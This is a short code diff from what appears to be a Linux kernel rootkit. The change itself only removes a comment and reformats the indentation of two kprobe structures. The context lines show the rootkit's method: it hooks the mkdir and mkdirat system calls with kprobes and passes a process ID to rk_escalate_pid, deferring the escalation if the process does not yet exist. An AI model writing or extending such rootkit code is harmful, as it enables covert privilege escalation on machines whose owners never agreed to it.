@@ -90,7 +90,6 @@ static int rk_handle_mkdir(const char *name)
 
 	ret = rk_escalate_pid(pid);
 	if (ret == -ESRCH) {
-		// Target does not exist yet, defer delivery
 		deferred_pid = pid;
 		return 0;
 	}
@@ -142,13 +141,13 @@ static int rk_pre_mkdirat(struct kprobe *p, struct pt_regs *regs)
 }
 
 static struct kprobe rk_kprobe_mkdir = {
-	.symbol_name = "__x64_sys_mkdir",
-	.pre_handler = rk_pre_mkdir,
+    .symbol_name = "__x64_sys_mkdir",
+    .pre_handler = rk_pre_mkdir,
 };
 
 static struct kprobe rk_kprobe_mkdirat = {
-	.symbol_name = "__x64_sys_mkdirat",
-	.pre_handler = rk_pre_mkdirat,
+    .symbol_name = "__x64_sys_mkdirat",
+    .pre_handler = rk_pre_mkdirat,
 };
 
 static int rk_proc_show(struct seq_file *m, void *v)
